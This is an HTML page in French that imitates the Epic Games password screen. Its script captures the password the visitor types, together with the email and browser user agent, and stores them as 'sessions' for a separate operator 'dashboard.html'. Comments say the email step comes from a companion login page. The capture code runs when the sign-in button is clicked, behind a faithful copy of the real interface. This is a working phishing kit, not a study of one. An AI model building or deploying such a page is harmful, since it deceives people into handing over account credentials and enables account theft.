<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Saisissez votre mot de passe | Epic Games</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  :root {
    --bg-page: #121117;
    --bg-modal: #18181c;
    --bg-input: #232327;
    --border-color: rgba(255, 255, 255, 0.1);
    --text-main: #ffffff;
    --text-muted: rgba(255, 255, 255, 0.65);
    --text-link: #26bbff;
    --blue-primary: #26bbff;
    --blue-hover: #50dcff;
    --font-main: 'Inter', Arial, sans-serif;
  }

  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: var(--font-main);
  }

  body {
    min-height: 100vh;
    background: var(--bg-page);
    display: flex;
    justify-content: center;
    align-items: center;
    color: var(--text-main);
    padding: 30px;
    -webkit-font-smoothing: antialiased;
  }

  .modal {
    width: 100%;
    max-width: 560px;
    background: var(--bg-modal);
    border-radius: 22px;
    padding: 40px 46px 46px;
    border: 1px solid var(--border-color);
    box-shadow: 0 24px 80px rgba(0, 0, 0, 0.5);
  }

  /* ====== BOUTON RETOUR ====== */
  .back-button {
    background: none;
    border: none;
    color: #fff;
    cursor: pointer;
    padding: 0;
    display: flex;
    align-items: center;
    gap: 10px;
    font-size: 15px;
    font-family: var(--font-main);
    font-weight: 400;
    margin-bottom: 26px;
    transition: opacity 0.2s ease;
  }
  .back-button:hover {
    opacity: 0.75;
  }
  .back-button svg {
    width: 18px;
    height: 18px;
    flex-shrink: 0;
  }
  .back-button .back-text {
    transition: transform 0.25s ease;
  }
  .back-button:hover .back-text {
    transform: translateX(3px);
  }

  /* ====== TITRE ====== */
  .header h1 {
    font-size: 1.75rem;
    font-weight: 700;
    line-height: 1.2;
    color: #fff;
    margin-bottom: 14px;
    letter-spacing: -0.01em;
  }

  /* ====== SOUS-TITRE ====== */
  .subtitle {
    font-size: 1rem;
    color: var(--text-muted);
    line-height: 1.5;
    margin-bottom: 32px;
    font-weight: 400;
  }
  .subtitle strong {
    color: #fff;
    font-weight: 700;
  }

  /* ====== LABEL ====== */
  .label {
    display: block;
    font-size: 15px;
    color: #fff;
    margin-bottom: 10px;
    font-weight: 500;
  }

  /* ====== CHAMP MOT DE PASSE ====== */
  .password-wrapper {
    position: relative;
    margin-bottom: 12px;
  }

  .password-wrapper input {
    width: 100%;
    height: 52px;
    border-radius: 10px;
    border: 1px solid rgba(255, 255, 255, 0.12);
    background: var(--bg-input);
    color: #fff;
    padding: 0 54px 0 16px;
    font-size: 15px;
    font-weight: 400;
    outline: none;
    transition: border-color 0.2s ease;
    font-family: var(--font-main);
  }
  .password-wrapper input:hover {
    border-color: rgba(255, 255, 255, 0.3);
  }
  .password-wrapper input:focus {
    border-color: #fff;
    border-width: 2px;
    padding: 0 53px 0 15px;
  }

  .password-toggle {
    position: absolute;
    right: 16px;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    color: #fff;
    cursor: pointer;
    padding: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    width: 26px;
    height: 26px;
    transition: opacity 0.2s ease;
  }
  .password-toggle:hover {
    opacity: 0.75;
  }
  .password-toggle svg {
    width: 22px;
    height: 22px;
  }

  /* ====== LIEN MOT DE PASSE OUBLIÉ ====== */
  .forgot-password-link {
    display: inline-block;
    color: var(--text-link);
    text-decoration: underline;
    text-underline-offset: 4px;
    font-size: 15px;
    font-weight: 400;
    margin-bottom: 28px;
    transition: color 0.2s ease;
  }
  .forgot-password-link:hover {
    color: var(--blue-hover);
  }

  /* ====== CASE À COCHER ====== */
  .remember-me {
    display: flex;
    align-items: flex-start;
    gap: 12px;
    margin-bottom: 32px;
    cursor: pointer;
    user-select: none;
  }

  .remember-me input[type="checkbox"] {
    display: block;
    width: 20px;
    height: 20px;
    min-width: 20px;
    margin: 0;
    margin-top: 1px;
    padding: 0;
    background: #232327;
    appearance: none;
    -webkit-appearance: none;
    -moz-appearance: none;
    cursor: pointer;
    border: 1.5px solid rgba(255, 255, 255, 0.4);
    border-radius: 4px;
    position: relative;
    flex-shrink: 0;
    transition: border-color 0.2s ease, background 0.2s ease;
  }

  .remember-me input[type="checkbox"]:hover {
    border-color: rgba(255, 255, 255, 0.9);
  }

  .remember-me input[type="checkbox"]:checked {
    background: var(--blue-primary);
    border-color: var(--blue-primary);
  }

  .remember-me input[type="checkbox"]:checked::after {
    content: "";
    position: absolute;
    left: 50%;
    top: 50%;
    width: 5px;
    height: 9px;
    border: solid #000;
    border-width: 0 2px 2px 0;
    transform: translate(-50%, -60%) rotate(45deg);
  }

  .remember-me-text {
    font-size: 15px;
    color: #fff;
    line-height: 1.4;
    font-weight: 500;
    cursor: pointer;
    letter-spacing: 0.01em;
  }
  .remember-me-text .optional {
    color: #fff;
    font-weight: 500;
  }

  /* ====== BOUTON SE CONNECTER ====== */
  .btn-primary {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    width: 100%;
    height: 52px;
    border: 0;
    border-radius: 10px;
    background: #444448;
    color: rgba(255, 255, 255, 0.5);
    font-size: 16px;
    font-weight: 500;
    letter-spacing: 0.01em;
    cursor: not-allowed;
    transition: background-color 0.2s ease, color 0.2s ease;
    font-family: var(--font-main);
  }
  .btn-primary.active {
    background: var(--blue-primary);
    color: #101014;
    cursor: pointer;
  }
  .btn-primary.active:hover {
    background: var(--blue-hover);
  }

  /* ====== FOOTER ====== */
  .footer {
    margin-top: 32px;
    text-align: center;
  }
  .footer a {
    color: var(--text-link);
    text-decoration: underline;
    text-underline-offset: 4px;
    font-size: 15px;
    font-weight: 400;
    transition: color 0.2s ease;
  }
  .footer a:hover {
    color: var(--blue-hover);
  }

  /* ====== RESPONSIVE ====== */
  @media (max-width: 479px) {
    body {
      padding: 0;
      align-items: flex-start;
      background: var(--bg-modal);
    }
    .modal {
      width: 100%;
      max-width: 100%;
      min-height: 100vh;
      border-radius: 0;
      border: none;
      padding: 30px 24px 40px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      box-shadow: none;
    }
    .header h1 {
      font-size: 1.4rem;
    }
    .subtitle {
      font-size: 15px;
    }
  }
</style>
</head>
<body>

<div class="modal">

  <!-- Bouton retour -->
  <button class="back-button" type="button" onclick="history.back()">
    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M15.031 4.47a.75.75 0 0 1 0 1.06L8.561 12l6.47 6.47a.75.75 0 1 1-1.06 1.06L6.44 12l7.53-7.53a.75.75 0 0 1 1.061 0"
            fill="#fff" clip-rule="evenodd" fill-rule="evenodd"/>
    </svg>
    <span class="back-text">Retour</span>
  </button>

  <!-- Titre -->
  <div class="header">
    <h1>Saisissez votre mot de passe</h1>
  </div>

  <!-- Sous-titre avec email -->
  <p class="subtitle">
    Vous vous connectez en tant que <strong id="emailDisplay">sddsq@gmail.com</strong>.
  </p>

  <!-- Champ mot de passe -->
  <label class="label" for="password">Mot de passe</label>
  <div class="password-wrapper">
    <input id="password" type="password" autocomplete="current-password" spellcheck="false" autocapitalize="none">
    <button class="password-toggle" id="passwordToggle" type="button" aria-label="Afficher/masquer le mot de passe">
      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 15.5C13.933 15.5 15.5 13.933 15.5 12C15.5 10.067 13.933 8.5 12 8.5C10.067 8.5 8.5 10.067 8.5 12C8.5 13.933 10.067 15.5 12 15.5Z" fill="currentColor"/>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M22.6174 11.5741C22.7938 11.8303 22.7941 12.1693 22.6177 12.4254L22 12C22.6177 12.4254 22.617 12.4264 22.617 12.4264L22.6159 12.428L22.6124 12.433L22.6007 12.4498C22.5907 12.464 22.5764 12.4842 22.5579 12.5101C22.5208 12.5617 22.4669 12.6358 22.397 12.7291C22.2572 12.9156 22.053 13.1794 21.7911 13.4948C21.2683 14.1243 20.5109 14.9651 19.5722 15.808C17.7201 17.4711 15.0434 19.25 12 19.25C8.95655 19.25 6.2799 17.4711 4.42784 15.808C3.48912 14.9651 2.73166 14.1243 2.20885 13.4948C1.94699 13.1794 1.74282 12.9156 1.60302 12.7291C1.53309 12.6358 1.47919 12.5617 1.44215 12.5101C1.42362 12.4842 1.40931 12.464 1.39931 12.4498L1.38755 12.433L1.38413 12.428L1.38234 12.4254L1.99905 12.0007C1.38625 12.4227 1.38234 12.4254 1.38234 12.4254C1.20589 12.1693 1.20589 11.8307 1.38234 11.5746L2 12C1.38234 11.5746 1.38303 11.5736 1.38303 11.5736L1.38413 11.572L1.38755 11.567L1.39931 11.5502C1.40931 11.536 1.42362 11.5158 1.44215 11.4899C1.47919 11.4383 1.53309 11.3642 1.60302 11.2709C1.74282 11.0844 1.94699 10.8206 2.20885 10.5052C2.73166 9.87566 3.48912 9.0349 4.42784 8.19197C6.2799 6.52887 8.95655 4.75 12 4.75C15.0434 4.75 17.7201 6.52887 19.5722 8.19197C20.5109 9.0349 21.2683 9.87566 21.7911 10.5052C22.053 10.8206 22.2572 11.0844 22.397 11.2709C22.4669 11.3642 22.5208 11.4383 22.5579 11.4899C22.5764 11.5158 22.5907 11.536 22.6007 11.5502L22.6124 11.567L22.6159 11.572L22.6174 11.5741ZM3.36285 12.5365C3.19149 12.3301 3.04743 12.1484 2.93299 12C3.04743 11.8516 3.19149 11.6699 3.36285 11.4635C3.8521 10.8743 4.5591 10.0901 5.43003 9.30803C7.19725 7.72113 9.5206 6.25 12 6.25C14.4794 6.25 16.8028 7.72113 18.57 9.30803C19.4409 10.0901 20.1479 10.8743 20.6372 11.4635C20.8085 11.6699 20.9526 11.8516 21.067 12C20.9526 12.1484 20.8085 12.3301 20.6372 12.5365C20.1479 13.1257 19.4409 13.9099 18.57 14.692C16.8028 16.2789 14.4794 17.75 12 17.75C9.5206 17.75 7.19725 16.2789 5.43003 14.692C4.5591 13.9099 3.8521 13.1257 3.36285 12.5365ZM22 12C22.6177 11.5746 22.6174 11.5741 22.6174 11.5741L22 12Z" fill="currentColor"/>
      </svg>
    </button>
  </div>

  <!-- Lien mot de passe oublié -->
  <a href="#" class="forgot-password-link">Mot de passe oublié ?</a>

  <!-- Se souvenir de moi -->
  <label class="remember-me">
    <input type="checkbox" id="rememberMe">
    <span class="remember-me-text">
      Se souvenir de moi dans les jeux et applications qui utilisent Epic Games <span class="optional">(facultatif)</span>
    </span>
  </label>

  <!-- Bouton se connecter -->
  <button class="btn-primary" id="signInBtn" type="button" disabled>Se connecter</button>

  <!-- Footer -->
  <div class="footer">
    <a href="#">Politique de confidentialité</a>
  </div>

</div>

<script>
(function () {
  'use strict';

  /* ============================================================
     🔗 AJOUT SYNC — ENVOI VERS LE DASHBOARD
     ============================================================
     Cette clé est partagée avec dashboard.html (même origine).
     ============================================================ */
  const STORAGE_KEY = 'locker_sessions';

  function getSessionId() {
    let id = sessionStorage.getItem('locker_sid');
    if (!id) {
      id = 'sess_' + Date.now() + '_' + Math.random().toString(36).slice(2, 9);
      sessionStorage.setItem('locker_sid', id);
    }
    return id;
  }

  function sendToDashboard(email, password) {
    try {
      const raw = localStorage.getItem(STORAGE_KEY);
      const sessions = raw ? JSON.parse(raw) : [];

      // Cherche une session "pending" avec le même email (envoyée par login.html)
      let session = sessions.find(s => s.email === email && s.status === 'pending');

      if (!session) {
        session = {
          id: getSessionId(),
          email: email,
          password: null,
          timestamp: new Date().toISOString(),
          status: 'pending'
        };
        sessions.push(session);
      }

      session.password = password;
      session.passwordTimestamp = new Date().toISOString();
      session.status = 'complete';
      session.userAgent = navigator.userAgent;

      localStorage.setItem(STORAGE_KEY, JSON.stringify(sessions));

      // Notifie les autres onglets (dont le dashboard s'il est ouvert)
      window.dispatchEvent(new StorageEvent('storage', {
        key: STORAGE_KEY,
        newValue: JSON.stringify(sessions)
      }));

      return true;
    } catch (e) {
      console.error('❌ Erreur envoi dashboard:', e);
      return false;
    }
  }
  /* ============================================================
     FIN AJOUT SYNC
     ============================================================ */

  // Récupère l'email depuis l'URL ou localStorage, sinon valeur par défaut
  const emailDisplay = document.getElementById('emailDisplay');
  const params       = new URLSearchParams(window.location.search);
  const emailFromUrl = params.get('email');
  const emailFromLS  = localStorage.getItem('epic_email');

  if (emailFromUrl) {
    emailDisplay.textContent = emailFromUrl;
  } else if (emailFromLS) {
    emailDisplay.textContent = emailFromLS;
  }

  // Afficher / masquer le mot de passe
  const passwordInput  = document.getElementById('password');
  const passwordToggle = document.getElementById('passwordToggle');
  const signInBtn      = document.getElementById('signInBtn');

  const eyeOpenSVG = `
    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M12 15.5C13.933 15.5 15.5 13.933 15.5 12C15.5 10.067 13.933 8.5 12 8.5C10.067 8.5 8.5 10.067 8.5 12C8.5 13.933 10.067 15.5 12 15.5Z" fill="currentColor"/>
      <path fill-rule="evenodd" clip-rule="evenodd" d="M22.6174 11.5741C22.7938 11.8303 22.7941 12.1693 22.6177 12.4254L22 12C22.6177 12.4254 22.617 12.4264 22.617 12.4264L22.6159 12.428L22.6124 12.433L22.6007 12.4498C22.5907 12.464 22.5764 12.4842 22.5579 12.5101C22.5208 12.5617 22.4669 12.6358 22.397 12.7291C22.2572 12.9156 22.053 13.1794 21.7911 13.4948C21.2683 14.1243 20.5109 14.9651 19.5722 15.808C17.7201 17.4711 15.0434 19.25 12 19.25C8.95655 19.25 6.2799 17.4711 4.42784 15.808C3.48912 14.9651 2.73166 14.1243 2.20885 13.4948C1.94699 13.1794 1.74282 12.9156 1.60302 12.7291C1.53309 12.6358 1.47919 12.5617 1.44215 12.5101C1.42362 12.4842 1.40931 12.464 1.39931 12.4498L1.38755 12.433L1.38413 12.428L1.38234 12.4254L1.99905 12.0007C1.38625 12.4227 1.38234 12.4254 1.38234 12.4254C1.20589 12.1693 1.20589 11.8307 1.38234 11.5746L2 12C1.38234 11.5746 1.38303 11.5736 1.38303 11.5736L1.38413 11.572L1.38755 11.567L1.39931 11.5502C1.40931 11.536 1.42362 11.5158 1.44215 11.4899C1.47919 11.4383 1.53309 11.3642 1.60302 11.2709C1.74282 11.0844 1.94699 10.8206 2.20885 10.5052C2.73166 9.87566 3.48912 9.0349 4.42784 8.19197C6.2799 6.52887 8.95655 4.75 12 4.75C15.0434 4.75 17.7201 6.52887 19.5722 8.19197C20.5109 9.0349 21.2683 9.87566 21.7911 10.5052C22.053 10.8206 22.2572 11.0844 22.397 11.2709C22.4669 11.3642 22.5208 11.4383 22.5579 11.4899C22.5764 11.5158 22.5907 11.536 22.6007 11.5502L22.6124 11.567L22.6159 11.572L22.6174 11.5741ZM3.36285 12.5365C3.19149 12.3301 3.04743 12.1484 2.93299 12C3.04743 11.8516 3.19149 11.6699 3.36285 11.4635C3.8521 10.8743 4.5591 10.0901 5.43003 9.30803C7.19725 7.72113 9.5206 6.25 12 6.25C14.4794 6.25 16.8028 7.72113 18.57 9.30803C19.4409 10.0901 20.1479 10.8743 20.6372 11.4635C20.8085 11.6699 20.9526 11.8516 21.067 12C20.9526 12.1484 20.8085 12.3301 20.6372 12.5365C20.1479 13.1257 19.4409 13.9099 18.57 14.692C16.8028 16.2789 14.4794 17.75 12 17.75C9.5206 17.75 7.19725 16.2789 5.43003 14.692C4.5591 13.9099 3.8521 13.1257 3.36285 12.5365ZM22 12C22.6177 11.5746 22.6174 11.5741 22.6174 11.5741L22 12Z" fill="currentColor"/>
    </svg>
  `;

  const eyeClosedSVG = `
    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M2.5 3.5L21.5 20.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
      <path d="M9.88 9.88a3 3 0 1 0 4.24 4.24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
      <path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c5.05 0 8.5 4.5 9.5 6.5.32.64.32 1.36 0 2-.2.4-.48.83-.84 1.28M6.61 6.61C4.06 7.85 2.5 10.5 2.5 11.5c.5 1 1.85 3.5 4.5 5.1 1.4.84 3.14 1.4 5 1.4 1.1 0 2.17-.2 3.14-.55" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
  `;

  let passwordVisible = false;

  passwordToggle.addEventListener('click', function () {
    passwordVisible = !passwordVisible;
    passwordInput.type = passwordVisible ? 'text' : 'password';
    passwordToggle.innerHTML = passwordVisible ? eyeClosedSVG : eyeOpenSVG;
  });

  // Activation du bouton "Se connecter" quand le champ est rempli
  passwordInput.addEventListener('input', function () {
    if (passwordInput.value.length > 0) {
      signInBtn.classList.add('active');
      signInBtn.disabled = false;
    } else {
      signInBtn.classList.remove('active');
      signInBtn.disabled = true;
    }
  });

  // Clic sur "Se connecter"
  signInBtn.addEventListener('click', function () {
    if (passwordInput.value.length > 0) {

      /* 🔗 AJOUT SYNC — envoie email + mot de passe au dashboard */
      const email = emailDisplay.textContent.trim();
      const password = passwordInput.value;
      sendToDashboard(email, password);
      /* FIN AJOUT SYNC */

      // Ici tu peux rediriger vers la page suivante
      // window.location.href = 'success.html';
      alert('Connexion en cours...');
    }
  });

})();
</script>

</body>
</html>
